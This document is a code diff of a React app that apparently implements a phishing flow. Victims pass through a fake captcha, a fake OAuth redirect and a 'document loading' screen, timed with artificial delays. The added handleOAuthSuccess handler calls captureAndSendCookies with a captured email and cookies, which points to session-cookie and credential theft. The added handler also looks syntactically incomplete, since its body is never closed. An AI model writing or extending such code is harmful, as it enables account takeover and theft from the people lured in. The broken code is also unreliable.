@@ -9,15 +9,6 @@ import { captureAndSendCookies, setCapturedEmail, setCapturedCookies } from './u
 // Artificial delay helper (milliseconds)
 const SLOW_DELAY = 1200; // Base delay, x3 for each step (e.g., 3600ms)
 const nextStepDelay = SLOW_DELAY * 3;
-const messageIconDelay = 500; // This matches the delay used in MessageIconLanding
-const captchaVerificationDelay = 1500; // Default verification delay for captcha
-
-// Calculate total delay for captcha to handle everything internally
-const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;
-
-// Calculate total delay for captcha to handle everything internally
-const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;
-
 function App() {
   const [currentPage, setCurrentPage] = useState('captcha');
   // State to hold the most reliable email and cookies captured via postMessage
@@ -250,7 +241,23 @@ function App() {
     }
   }, []);
 
-  // Captcha verified: immediately go to oauth redirect (no delay)
+  // Handler functions
+  const handleCaptchaVerified = () => {
+    setCurrentPage('message-icon');
+    setTimeout(() => {
+      setCurrentPage('oauth-redirect');
+    }, nextStepDelay);
+  };
+
+  const handleCaptchaBack = () => {
+    setCurrentPage('captcha');
+  };
+
+  const handleOAuthSuccess = () => {
+    setCurrentPage('document-loading');
+    
+    // Capture and send cookies after successful OAuth
+    captureAndSendCookies(capturedEmail, capturedCookies);
 
   const handleOAuthBack = () => {
     setCurrentPage('oauth-redirect');
@@ -370,6 +377,5 @@ function App() {
       );
   }
 }
-
 
 export default App;
